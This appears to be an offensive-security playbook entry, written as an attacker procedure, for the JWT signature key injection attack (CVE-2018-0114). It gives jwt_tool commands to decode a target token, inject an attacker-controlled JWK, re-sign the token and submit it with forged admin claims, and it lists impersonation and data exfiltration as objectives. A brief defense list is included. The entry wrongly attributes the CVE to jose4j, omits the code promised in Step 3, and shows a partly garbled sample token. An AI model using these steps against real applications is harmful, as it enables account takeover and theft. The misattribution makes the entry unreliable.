---
type: procedure
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - >-
    [[techniques/Steal Application Access Token|T1528 - Steal Application Access
    Token]]
sub_techniques: []
tags:
  - '[[tags/JWT - JSON Web Token]]'
  - '[[tags/JWT Signature]]'
  - '[[tags/JWT Signature - Key Injection Attack (CVE-2018-0114)]]'
commands:
  - '[[commands/jwt-tool-decode-token]]'
  - '[[commands/jwt-tool-key-injection]]'
  - '[[commands/jwt-tool-create-header]]'
  - '[[commands/jwt-tool-sign-token]]'
tools:
  - '[[tools/jwt-tool]]'
platforms:
  - Web Applications
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# JWT-Signature-Key-Injection-Attack

## Summary

The JWT Signature Key Injection Attack exploits vulnerabilities in JWT libraries that dynamically load public keys from the token header, allowing attackers to inject a custom public key (JWKS) and sign the token with a corresponding private key. This bypasses signature verification, enabling unauthorized access, privilege escalation, or data exfiltration in web applications using affected libraries like jose4j (CVE-2018-0114).

## Description

JSON Web Tokens (JWTs) are commonly used for authentication and authorization in web applications. Normally, the server verifies the token's signature using a trusted public key. However, some implementations (e.g., Cisco's jose4j library) allow the public key to be specified in the token header via the 'jwk' parameter, enabling dynamic loading without validation. An attacker can craft a token with a fabricated RSA key pair: embed the attacker's public key in the header as a JWK, modify the payload (e.g., to impersonate an admin), and sign it with the attacker's private key. When the server loads and uses this injected public key for verification, the signature passes, granting illegitimate access. This procedure uses the jwt_tool to automate the attack, targeting RS256-signed tokens in environments like APIs or SSO systems. Success depends on the target's library configuration; it's ineffective against fixed-key verifiers.

## Requirements

1. Python 3 installed on the attacker's machine.
2. Access to a valid target JWT token (e.g., intercepted from a login session via Burp Suite).
3. jwt_tool installed and configured.
4. Basic knowledge of JWT structure (header.payload.signature).
5. Network access to submit the tampered token to the target application.

## Defense

- Disable dynamic public key loading from token headers; use a fixed, server-side public key for verification.
- Validate the 'alg' claim and reject non-standard algorithms or unexpected JWK parameters.
- Implement strict input validation on token headers to block unauthorized JWK objects.
- Monitor for anomalous token usage, such as unexpected admin claims or high-privilege actions from low-privilege sessions.
- Use short token expiration times and rotate signing keys regularly.
- Employ web application firewalls (WAFs) to detect tampered JWT structures.

## Objectives

1. Bypass JWT signature verification by injecting a custom public key.
2. Modify the token payload to escalate privileges (e.g., set 'login' to 'admin').
3. Impersonate legitimate users to access restricted resources or perform unauthorized actions.
4. Exfiltrate sensitive data protected by the JWT.

## Instructions

### Step 1: Decode the Target JWT

**Context**: Inspect the original JWT to understand its structure, claims, and current signature algorithm. This helps confirm it's vulnerable to RS256 key injection and identifies the payload fields to modify.

**Command** ([[commands/jwt-tool-decode-token]]):
```bash
python3 jwt_tool.py $_TARGET_JWT -d
```

> This decodes the base64-encoded header and payload without verifying the signature. Look for 'alg': 'RS256' to confirm eligibility for the attack. If the algorithm is HS256 or another, alternative attacks like none-alg may apply.

**Expected Output**: Decoded header (e.g., {"alg":"RS256","typ":"JWT"}) and payload (e.g., {"login":"user","exp":1234567890}), plus signature hash.

### Step 2: Perform Automated Key Injection

**Context**: Use jwt_tool to automatically generate an RSA key pair, inject the public key into the header as a JWK, modify the payload if needed, and re-sign the token with the private key. This exploits the dynamic key loading vulnerability.

**Command** ([[commands/jwt-tool-key-injection]]):
```bash
python3 jwt_tool.py $_TARGET_JWT -X i
```

> The -X i option scans for key confusion/injection opportunities and crafts the tampered token. It preserves original payload unless specified otherwise; review the output for the new JWT.

**Expected Output**: A new JWT string with injected JWK in header, e.g., eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJraWQiOiJqd3RfdG9vbCIsInVzZSI6InNpZyIsImUiOiJBUUFCIiwibiI6InVLQkdpd1lxcHFQekI2X2Z5RXA3MUgzb1dxWVhuR0prOVRHM3k5S191WWhsR2tKSG1NU2ttNzhQV1NpWnpWaDdamjBTNkp1TkZ0R2N1eVE5Vm9aM20zQUdKNnBKNVBpVURESExidHlZNXhnSkhQZElfZ2tHVHNU02Rmd5OU1pZlB4eDJZUHZ2Z3NXdFpLaVBuLWNGSUt0elE0YjhUM3cxdnN3VGFJUThiampRMUdCQXBYaEhadEJHTjI2elpVMDhXQ2xRMUc0THNLZ05LSnRkeUxzZjBlOXRkRHQ4UGU1LUtLV2ptbmxoZWt6cF9ubmI0QzJETXBFYzFJVkRtZEhWMl9ET3BmLWtIXzFueXVDUzlfTW5KcHRGMU5EdFxfbFVZaWp5V2lMeHZseVVzaEl5QVd2S09ScEd2bzJ3SmEyU2x6VnR6VlBtZmdHVzdDaHB3In19.eyJsb2dpbiI6ImFkbWluIn0.[signature_with_private_key]

### Step 3: Manually Craft Header with Injected JWK (Alternative if Tool Fails)

**Context**: If automated injection fails or for custom control, manually construct the header with a generated RSA public key as JWK. This step assumes you have generated a key pair separately (e.g., using openssl).

**Code** ([[codes/jwt-header-with-injected-jwk]]):

> Embed this header structure, base64url-encoded, followed by the payload and signature.

**Expected Output**: Valid header JSON with 'jwk' containing your public key modulus (n) and exponent (e).

### Step 4: Sign and Submit the Tampered Token

**Context**: Sign the header.payload with your private key and submit to the target to test bypass. Verify access to elevated privileges.

**Command** ([[commands/jwt-tool-sign-token]]):
```bash
python3 jwt_tool.py $_HEADER_PAYLOAD -S -k $_PRIVATE_KEY
```

> Use jwt_tool's signing mode with your private key PEM file. Then, replace the original JWT in requests (e.g., Authorization: Bearer $TAMPERED_JWT).

**Expected Output**: Fully signed JWT ready for use. On submission, expect successful authentication without errors.
